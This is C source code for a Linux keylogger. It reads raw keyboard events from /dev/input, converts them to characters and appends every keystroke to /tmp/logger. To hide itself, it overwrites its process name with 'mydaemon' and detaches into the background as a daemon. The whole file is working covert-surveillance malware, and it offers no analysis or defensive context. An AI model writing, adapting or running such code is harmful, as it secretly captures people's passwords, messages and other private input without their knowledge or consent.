#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <ctype.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

#define LOG "/tmp/logger"

char keymap[KEY_SPACE + 1] = {
	[KEY_A] = 'a', [KEY_B] = 'b', [KEY_C] = 'c',
	[KEY_D] = 'd', [KEY_E] = 'e', [KEY_F] = 'f',
	[KEY_G] = 'g', [KEY_H] = 'h', [KEY_I] = 'i',
	[KEY_J] = 'j', [KEY_K] = 'k', [KEY_L] = 'l',
	[KEY_M] = 'm', [KEY_N] = 'n', [KEY_O] = 'o',
	[KEY_P] = 'p', [KEY_Q] = 'q', [KEY_R] = 'r',
	[KEY_S] = 's', [KEY_T] = 't', [KEY_U] = 'u',
	[KEY_V] = 'v', [KEY_W] = 'w', [KEY_X] = 'x',
	[KEY_Y] = 'y', [KEY_Z] = 'z', [KEY_SPACE] = ' ',
};

int write_file(char character){
	char buffer[1];
	buffer[0] = character;
	int logfd = open(LOG, O_CREAT | O_WRONLY | O_APPEND, S_IROTH);
	fsync(logfd);
	ssize_t written = write(logfd, &buffer, sizeof(buffer));
	
	if(written == -1){
		perror("Error: ");
		exit(-1);
	}
	
	return 1;
}

const char *locate_event(){
	static char buffer[8];
	const char *command = "grep -i -A 4 keyboard /proc/bus/input/devices | sed -n '5p' | grep -o event.";
	FILE *stream = popen(command, "r" );
	char *read_stream = fgets(buffer, sizeof(buffer), stream);
	pclose(stream);
	
	size_t len = strlen(buffer);
	if (len > 0 && buffer[len -1] == '\n'){
		buffer[len -1] = '\0';
	}
	
	if(buffer[0] == '\0'){
		fprintf(stderr, "Error: locate_event returned an empty string\n");
		return NULL;
	}
	return buffer;
}
void read_kbd(){
	int shift_pressed = 0;
	int caps_pressed = 0;
	char path[32] = "/dev/input/";	
	const char *locate = locate_event();
	strcat(path, locate);
	struct input_event event;
	int fdkbd = open(path, O_RDONLY);
	if (fdkbd == -1){
		perror("Error in read_kbd: ");
	}
	
	while(1){
		ssize_t bytes = read(fdkbd, &event, sizeof(struct input_event));
		if (bytes == -1){
			perror("Error reading event");
			break;
		}

		if(event.code == KEY_LEFTSHIFT && event.value == 1){
			shift_pressed = 1;
		} else if(event.code == KEY_LEFTSHIFT && event.value == 0){
		  	shift_pressed = 0;
		}

		if(event.type == EV_LED && event.code == LED_CAPSL){
			if(event.value == 1){
				caps_pressed = 1;
			} else{
				caps_pressed = 0;
			}
		}

		if(event.type == EV_KEY && event.value == 1){
			if(shift_pressed == 1 || caps_pressed == 1){
				char key = keymap[event.code];
				char upper_case = toupper(key);
				write_file(upper_case);
			} else{
				char key = keymap[event.code];
				write_file(key);
			}		
		}
	}		    	
}


int main(int argc, char *argv[]){
	memset(argv[0], '0', strlen(argv[0]));
	strncpy(argv[0], "mydaemon", strlen(argv[0]));
	
	int background = daemon(1, 1);
	
	if(background == -1){
		perror("[MAIN] Daemonizing failed: ");
	}

	int prctl_result = prctl(PR_SET_NAME, "mydaemon", 0, 0, 0);

	if(prctl_result == -1){
		perror("[MAIN] Error setting program name: ");
	}

	read_kbd();
}
